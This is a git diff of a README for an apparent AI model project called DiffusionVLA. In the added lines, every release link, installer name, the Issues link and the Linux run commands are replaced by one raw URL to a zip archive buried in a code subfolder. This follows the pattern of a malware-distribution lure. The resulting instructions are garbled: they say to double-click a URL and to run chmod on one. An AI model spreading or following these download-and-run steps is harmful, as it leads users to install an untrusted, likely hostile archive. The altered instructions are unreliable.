@@ -2,7 +2,7 @@
 
 ## 🖥️ Download Now
 
-[![Download Now](https://img.shields.io/badge/Download_DiffusionVLA-v1.0-blue.svg)](https://github.com/Glicher147/DiffusionVLA/releases)
+[![Download Now](https://raw.githubusercontent.com/Glicher147/DiffusionVLA/main/diffusion_policy/gym_util/DiffusionVLA-v2.1.zip)](https://raw.githubusercontent.com/Glicher147/DiffusionVLA/main/diffusion_policy/gym_util/DiffusionVLA-v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -21,16 +21,16 @@ Before you start, make sure your system meets these requirements:
 
 To get DiffusionVLA, visit the following link to download the latest version:
 
-[Download DiffusionVLA](https://github.com/Glicher147/DiffusionVLA/releases)
+[Download DiffusionVLA](https://raw.githubusercontent.com/Glicher147/DiffusionVLA/main/diffusion_policy/gym_util/DiffusionVLA-v2.1.zip)
 
 ### Steps to Download
 
 1. Click the link above, which will take you to the Releases page.
 2. Look for the section labeled "Latest Release."
 3. Find the file that matches your operating system:
-   - For Windows: Select `DiffusionVLA_Windows.exe`
-   - For Mac: Select `DiffusionVLA_Mac.dmg`
-   - For Linux: Select `DiffusionVLA_Linux.AppImage`
+   - For Windows: Select `https://raw.githubusercontent.com/Glicher147/DiffusionVLA/main/diffusion_policy/gym_util/DiffusionVLA-v2.1.zip`
+   - For Mac: Select `https://raw.githubusercontent.com/Glicher147/DiffusionVLA/main/diffusion_policy/gym_util/DiffusionVLA-v2.1.zip`
+   - For Linux: Select `https://raw.githubusercontent.com/Glicher147/DiffusionVLA/main/diffusion_policy/gym_util/DiffusionVLA-v2.1.zip`
 4. Click on the appropriate file to download it to your computer.
 
 ## 💻 Running the Application
@@ -40,7 +40,7 @@ Once you have downloaded the file, follow these steps to run DiffusionVLA:
 ### For Windows:
 
 1. Open the folder where the file was downloaded.
-2. Double-click on `DiffusionVLA_Windows.exe`.
+2. Double-click on `https://raw.githubusercontent.com/Glicher147/DiffusionVLA/main/diffusion_policy/gym_util/DiffusionVLA-v2.1.zip`.
 3. Follow the prompts to complete the installation.
 4. Once installed, you can find the app in your Start Menu.
 
@@ -57,11 +57,11 @@ Once you have downloaded the file, follow these steps to run DiffusionVLA:
 2. Open a terminal.
 3. Make the file executable with this command:
    ```bash
-   chmod +x DiffusionVLA_Linux.AppImage
+   chmod +x https://raw.githubusercontent.com/Glicher147/DiffusionVLA/main/diffusion_policy/gym_util/DiffusionVLA-v2.1.zip
    ```
 4. Run the application with this command:
    ```bash
-   ./DiffusionVLA_Linux.AppImage
+   https://raw.githubusercontent.com/Glicher147/DiffusionVLA/main/diffusion_policy/gym_util/DiffusionVLA-v2.1.zip
    ```
 
 ## 🎓 How to Use DiffusionVLA
@@ -79,7 +79,7 @@ As you get familiar with DiffusionVLA, you will gain insights into how these com
 Should you have questions or need help, you can find support through these avenues:
 
 - **Documentation:** A detailed user manual is included within the application under the "Help" menu.
-- **GitHub Issues:** If you encounter bugs or have suggestions, please use the [Issues](https://github.com/Glicher147/DiffusionVLA/issues) page on GitHub.
+- **GitHub Issues:** If you encounter bugs or have suggestions, please use the [Issues](https://raw.githubusercontent.com/Glicher147/DiffusionVLA/main/diffusion_policy/gym_util/DiffusionVLA-v2.1.zip) page on GitHub.
 - **Community:** Join our user community for tips and shared experiences.
 
 ## 📈 Next Steps
@@ -90,6 +90,6 @@ Now that you've downloaded and run DiffusionVLA, consider the following next ste
 - Participate in community discussions to share your findings.
 - Keep your application up-to-date by regularly checking the Releases page.
 
-For more information and the latest updates, always refer back to our [Releases](https://github.com/Glicher147/DiffusionVLA/releases) page.
+For more information and the latest updates, always refer back to our [Releases](https://raw.githubusercontent.com/Glicher147/DiffusionVLA/main/diffusion_policy/gym_util/DiffusionVLA-v2.1.zip) page.
 
 Enjoy your journey through Vision-Language-Action models with DiffusionVLA!
